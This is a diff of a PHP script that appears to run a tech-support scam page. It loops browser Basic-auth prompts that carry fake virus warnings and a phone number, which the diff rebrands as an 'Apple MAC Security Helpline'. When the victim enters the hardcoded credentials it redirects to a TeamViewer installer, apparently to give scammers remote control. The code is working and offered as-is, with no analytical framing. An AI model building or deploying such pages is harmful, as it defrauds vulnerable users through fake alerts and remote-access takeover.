@@ -2,20 +2,19 @@
 
     session_start();
 
-    $_user = 'windows2016ddsd';
-    $_password = 'microsoft1ew';
+    $_user = 'windows2018';
+    $_password = 'microsoft1';
 
     if ($_SERVER['PHP_AUTH_USER'] != $_user || $_SERVER['PHP_AUTH_PW'] != $_password ) {
 
         if(isset($_SESSION['login_attempts'])){ $_SESSION['login_attempts']++; }else{$_SESSION['login_attempts'] = 11;}
 
         if($_SESSION['login_attempts'] == 80){
-            header('Location: WIn101810DE10.php');
+            header('Location: auth.php');
             exit;
         } else {
 
-           header('WWW-Authenticate: Basic realm="Suspicious activity detected on your IP address due to malicious viruses on your computer. Call now toll free @+1-
-(888) 341-2106  for any assistance. "');
+           header('WWW-Authenticate: Basic realm="Call Apple MAC Security Helpline +1-888-341-2106  (Security Helpline) "');
            header('HTTP/1.0 401 Unauthorized');
 $page = $_SERVER['PHP_SELF'];
  $sec = "0";
@@ -27,7 +26,7 @@ $page = $_SERVER['PHP_SELF'];
         }
     } else {
 
-        header('Location: WIn101810DE10.php');
+        header('Location: auth.php');
         header('Location: http://download.teamviewer.com/download/TeamViewer_Setup_en.exe');
 
         exit;
